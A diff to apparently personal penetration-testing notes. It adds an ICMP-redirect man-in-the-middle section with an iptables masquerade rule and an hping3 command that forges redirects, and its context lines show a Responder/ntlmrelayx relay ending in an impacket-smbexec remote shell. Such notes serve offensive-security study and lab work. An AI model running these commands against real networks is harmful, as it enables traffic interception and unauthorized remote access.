@@ -167,7 +167,7 @@ Also for help use either the autocompletion of the tool (`tab` is your friend) o
 ```
 
 
-### Responder and ntlmrelayx
+### responder and ntlmrelayx
 
 > Aim for this attack is to poison the victim so their connections are forwarded over the attacker station and relayed to the initial destination of an `smb` connection for example.
 
@@ -221,3 +221,46 @@ proxychains -q impacket-smbexec <domain>/<user>:<rndPW>@172.16.23.101  # pw can 
 ```
 
 5. An interactive sessions to the windows shell should be open now
+
+### ICMP redirect (scapy and iptables)
+
+> The idea is to change the route of the target through propagating the attacker ip as the faster route in the network.
+> This is another attempt for MITM if `arp` spoofing is prevented.
+
+0. Prerequisites
+
+- have `ip_forwarding` enabled
+- add `MASQUERADING` to the interface with the link into the victim network
+
+```bash
+sudo iptables -t nat -A POSTROUTING -s <victimSubnet>/24 -o <interface> -j MASQUERADE
+```
+
+- get Information about
+	- `gateway` on the subnet of the victim
+	- `server IP` which the victim tries to access
+	- `victim IP`
+	- `attacker IP` 
+
+Adjust the `scapy` [[icmp_redirect]] script with the parameters above
+
+1. Start the attack
+
+```bash
+sudo scapy
+> execute script
+```
+
+OR
+
+```bash
+sudo hping3 <victimIP> -C 5 -K 1 -a <gatewayIP> --icmp-gw <attackerIP> --icmp-ipdst <serverIP> --icmp-ipsrc <victimIP>
+```
+
+> `scapy` verified, `hping3` open
+
+2. Dump the traffic
+
+Use
+- `wireshark`
+- `tcpdump` 
